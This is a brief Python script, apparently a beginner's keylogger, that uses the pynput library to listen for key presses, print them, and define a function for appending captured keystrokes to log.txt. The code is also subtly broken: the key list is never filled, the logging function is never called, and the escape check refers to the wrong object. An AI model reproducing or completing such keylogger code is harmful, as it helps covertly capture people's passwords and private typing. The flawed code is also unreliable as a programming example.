import pynput
from pynput.keyboard import Key, Listener

count = 0
Keys = []

def on_press(key):
    global Keys, count
    print("{0} Pressed".format(key))

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in Keys:
            f.write(key)
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Keys.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()